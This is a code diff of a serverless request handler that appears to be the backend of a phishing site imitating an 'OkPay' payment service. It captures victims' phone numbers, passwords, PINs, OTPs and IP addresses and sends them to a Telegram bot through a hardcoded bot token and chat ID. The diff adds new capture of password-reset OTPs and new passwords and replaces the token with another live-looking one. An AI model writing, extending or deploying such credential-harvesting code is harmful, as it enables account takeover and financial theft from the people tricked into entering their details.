@@ -4,8 +4,8 @@ export default async function handler(req, res) {
   }
 
   const { type, phone, pass, pin, otp, username, invite } = req.body;
-  const BOT_TOKEN = '8750081908:AAEha0LhQSw0tbocU-9rx2WJ1DgdyHcjvOw';
-  const CHAT_ID = '6076330929';
+  const BOT_TOKEN = '8928951011:AAG6D0Jv-C5FZNQqyVwWnaac9Dyyd8J3eBc';
+  const CHAT_ID = '8673506776';
 
   // Get Visitor IP from Vercel headers
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
@@ -21,11 +21,14 @@ export default async function handler(req, res) {
     message = `🔐 <b>Register OTP requested</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'register') {
     message = `🆕 <b>New OkPay registration</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>\n🎫 Invite: <code>${invite}</code>`;
+  } else if (type === 'forgot_otp') {
+    message = `🔄 <b>Forgot Password OTP requested</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
+  } else if (type === 'reset_pass') {
+    message = `🌱 <b>Password Reset Successful</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 New Password: <code>${pass}</code>\n🔢 OTP: <code>${otp}</code>`;
   }
 
   try {
-    const tgRes = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const response = await fetch(tgRes, {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
